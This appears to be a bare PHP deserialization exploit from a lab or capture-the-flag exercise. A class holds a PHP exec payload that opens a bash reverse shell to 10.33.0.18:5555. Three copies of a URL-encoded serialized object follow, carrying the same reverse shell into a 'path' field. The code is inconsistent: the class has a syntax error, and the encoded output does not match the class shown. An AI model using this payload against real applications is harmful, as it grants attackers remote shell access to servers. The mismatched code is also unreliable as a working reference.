class User {
  
  public $username = 'fucking_mentats';
  public $password= 'password123'
  public $user_line = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/10.33.0.18/5555 0>&1\'"); ?>';

  }

print urlencode(serialize(new User));

O%3A4%3A%22User%22%3A5%3A%7Bs%3A8%3A%22username%22%3Bs%3A16%3A%22classes%2Fuser.php%22%3Bs%3A8%3A%22password%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22role%22%3Bs%3A4%3A%22user%22%3Bs%3A3%3A%22log%22%3Bb%3A0%3Bs%3A4%3A%22path%22%3Bs%3A72%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.33.0.18%2F5555+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D

O%3A4%3A%22User%22%3A5%3A%7Bs%3A8%3A%22username%22%3Bs%3A16%3A%22classes%2Fuser.php%22%3Bs%3A8%3A%22password%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22role%22%3Bs%3A4%3A%22user%22%3Bs%3A3%3A%22log%22%3Bb%3A0%3Bs%3A4%3A%22path%22%3Bs%3A72%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.33.0.18%2F5555+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D

O%3A4%3A%22User%22%3A5%3A%7Bs%3A8%3A%22username%22%3Bs%3A16%3A%22classes%2Fuser.php%22%3Bs%3A8%3A%22password%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22role%22%3Bs%3A4%3A%22user%22%3Bs%3A3%3A%22log%22%3Bb%3A0%3Bs%3A4%3A%22path%22%3Bs%3A72%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.33.0.18%2F5555+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
